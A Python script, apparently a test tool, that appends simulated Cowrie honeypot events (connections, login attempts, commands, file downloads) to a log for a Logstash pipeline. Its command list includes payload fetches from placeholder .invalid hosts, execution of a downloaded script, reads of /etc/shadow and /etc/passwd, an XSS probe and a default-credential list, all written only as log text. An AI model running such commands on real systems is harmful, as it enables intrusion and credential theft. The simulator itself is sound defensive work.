#!/usr/bin/env python3
"""SENTINEL attack simulator.

Appends fake honeypot events, in the exact JSON Lines format of Cowrie,
to a shared log file that Logstash reads. See README.md for the contract.

Only the standard library is used. No network access is needed or used.
"""

import argparse
import hashlib
import json
import os
import random
import signal
import sys
import time
import uuid
from datetime import datetime, timezone

DEFAULT_OUTPUT = "/var/log/honeypot/cowrie.json"
SENSOR = "honeypot-sim"
DST_IP = "172.18.0.2"

# Events per minute and behaviour for each mode.
MODES = {
    "basic": {"rate": 10, "max_sessions": 2, "weights": {"scan": 40, "login": 40, "intrusion": 20, "burst": 0}},
    "enriched": {"rate": 30, "max_sessions": 4, "weights": {"scan": 20, "login": 25, "intrusion": 30, "burst": 25}},
    "stress": {"rate": 200, "max_sessions": 10, "weights": {"scan": 15, "login": 25, "intrusion": 30, "burst": 30}},
}

# Public /16 prefixes spread over several countries. They are approximate:
# the country shown on the map is whatever the Logstash GeoIP database says.
# What matters is that the addresses are public, so they can be geolocated.
IP_PREFIXES = [
    "114.114", "119.147", "218.92",    # China
    "95.213", "5.188", "46.161",       # Russia
    "177.12", "189.40", "201.17",      # Brazil
    "49.36", "103.21", "117.200",      # India
    "45.33", "104.248", "159.65",      # United States
    "85.214", "78.46", "138.201",      # Germany
    "175.126", "211.234",              # South Korea
    "113.161", "14.162",               # Vietnam
    "51.15", "91.121",                 # France
]

CREDENTIALS = [
    ("root", "root"), ("root", "123456"), ("root", "password"), ("root", "admin"),
    ("admin", "admin"), ("admin", "1234"), ("admin", "password"), ("user", "user"),
    ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("test", "test"), ("oracle", "oracle"),
    ("postgres", "postgres"), ("ftpuser", "ftpuser"), ("support", "support"),
    ("guest", "guest"), ("root", "toor"), ("root", "qwerty"), ("git", "git"),
]

COMMANDS = [
    "uname -a", "whoami", "id", "cat /etc/passwd", "ls -la", "pwd", "ps aux",
    "cat /proc/cpuinfo", "free -m", "ifconfig", "crontab -l", "history",
    "cd /tmp; ls", "wget http://files.invalid/x.sh", "curl -O http://files.invalid/bot",
    "chmod +x x.sh; ./x.sh", "echo <script>alert(1)</script>", "cat /etc/shadow",
]

DOWNLOAD_URLS = [
    "http://files.invalid/x.sh", "http://files.invalid/bot.arm7",
    "http://payload.invalid/miner", "http://payload.invalid/update.bin",
]

SSH_VERSIONS = ["SSH-2.0-libssh_0.9.6", "SSH-2.0-Go", "SSH-2.0-OpenSSH_8.9p1", "SSH-2.0-paramiko_3.4.0"]

_last_ts = None
_running = True


def now_utc():
    """UTC time in Cowrie format. Strictly increasing so events stay unique."""
    global _last_ts
    ts = time.time()
    if _last_ts is not None and ts <= _last_ts:
        ts = _last_ts + 0.000001
    _last_ts = ts
    return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def random_ip():
    return "%s.%d.%d" % (random.choice(IP_PREFIXES), random.randint(1, 254), random.randint(1, 254))


class Session:
    """One attack session: a coherent, ordered list of events."""

    def __init__(self, kind):
        self.id = uuid.uuid4().hex[:12]
        self.kind = kind
        self.src_ip = random_ip()
        self.src_port = random.randint(1024, 65535)
        self.protocol = "telnet" if random.random() < 0.2 else "ssh"
        self.dst_port = 2323 if self.protocol == "telnet" else 2222
        self.started = time.monotonic()
        self.steps = self._build_steps()

    def _build_steps(self):
        steps = [("cowrie.session.connect", {})]
        if self.protocol == "ssh":
            steps.append(("cowrie.client.version", {"version": random.choice(SSH_VERSIONS)}))
        if self.kind == "login":
            steps += self._failed_logins(random.randint(1, 3))
        elif self.kind == "burst":
            steps += self._failed_logins(random.randint(6, 15))
        elif self.kind == "intrusion":
            steps += self._failed_logins(random.randint(0, 2))
            user, pwd = random.choice(CREDENTIALS)
            steps.append(("cowrie.login.success", {"username": user, "password": pwd}))
            for _ in range(random.randint(1, 5)):
                steps.append(("cowrie.command.input", {"input": random.choice(COMMANDS)}))
            if random.random() < 0.25:
                digest = hashlib.sha256(os.urandom(16)).hexdigest()
                steps.append(("cowrie.session.file_download", {
                    "url": random.choice(DOWNLOAD_URLS),
                    "outfile": "var/lib/cowrie/downloads/" + digest,
                    "shasum": digest,
                }))
        steps.append(("cowrie.session.closed", {}))
        return steps

    @staticmethod
    def _failed_logins(count):
        out = []
        for _ in range(count):
            user, pwd = random.choice(CREDENTIALS)
            out.append(("cowrie.login.failed", {"username": user, "password": pwd}))
        return out

    @property
    def done(self):
        return not self.steps

    def next_event(self):
        eventid, extra = self.steps.pop(0)
        event = {"eventid": eventid}
        event.update(extra)
        event["src_ip"] = self.src_ip
        event["session"] = self.id
        event["protocol"] = self.protocol
        event["sensor"] = SENSOR
        if eventid == "cowrie.session.connect":
            event.update({"src_port": self.src_port, "dst_ip": DST_IP, "dst_port": self.dst_port})
            event["message"] = "New connection: %s:%d" % (self.src_ip, self.src_port)
        elif eventid == "cowrie.client.version":
            event["message"] = "Remote SSH version: %s" % extra["version"]
        elif eventid == "cowrie.login.failed":
            event["message"] = "login attempt [%s/%s] failed" % (extra["username"], extra["password"])
        elif eventid == "cowrie.login.success":
            event["message"] = "login attempt [%s/%s] succeeded" % (extra["username"], extra["password"])
        elif eventid == "cowrie.command.input":
            event["message"] = "CMD: %s" % extra["input"]
        elif eventid == "cowrie.session.file_download":
            event["message"] = "Downloaded URL (%s) with SHA-256 %s to %s" % (
                extra["url"], extra["shasum"], extra["outfile"])
        elif eventid == "cowrie.session.closed":
            duration = round(time.monotonic() - self.started, 1)
            event["duration"] = duration
            event["message"] = "Connection lost after %s seconds" % duration
        event["timestamp"] = now_utc()
        return event


def pick_kind(weights):
    kinds = list(weights)
    return random.choices(kinds, weights=[weights[k] for k in kinds])[0]


def stop(_signum, _frame):
    global _running
    _running = False


def run(mode, output):
    cfg = MODES[mode]
    interval = 60.0 / cfg["rate"]
    os.makedirs(os.path.dirname(output), exist_ok=True)
    active = []
    total = 0
    print("simulator: mode=%s rate=%d/min output=%s" % (mode, cfg["rate"], output), flush=True)

    # Append only, line buffered: Logstash sees each event as soon as it is written.
    with open(output, "a", encoding="utf-8", buffering=1) as fh:
        while _running:
            if len(active) < cfg["max_sessions"]:
                active.append(Session(pick_kind(cfg["weights"])))
            session = random.choice(active)

            # Burst sessions fire several attempts back to back.
            batch = 5 if session.kind == "burst" else 1
            emitted = 0
            while emitted < batch and not session.done:
                fh.write(json.dumps(session.next_event(), separators=(",", ":")) + "\n")
                fh.flush()
                emitted += 1
                total += 1
            if session.done:
                active.remove(session)

            # Sleep in proportion to the events written, so the rate stays on target.
            time.sleep(emitted * interval * random.uniform(0.7, 1.3))
    print("simulator: stopped after %d events" % total, flush=True)


def main():
    parser = argparse.ArgumentParser(description="SENTINEL attack simulator (Cowrie JSON format)")
    parser.add_argument("--mode", choices=sorted(MODES), default=os.environ.get("SIM_MODE", "basic"))
    parser.add_argument("--output", default=os.environ.get("SIM_OUTPUT", DEFAULT_OUTPUT))
    args = parser.parse_args()
    if args.mode not in MODES:
        sys.exit("invalid SIM_MODE: %s (use basic, enriched or stress)" % args.mode)
    signal.signal(signal.SIGTERM, stop)
    signal.signal(signal.SIGINT, stop)
    run(args.mode, args.output)


if __name__ == "__main__":
    main()
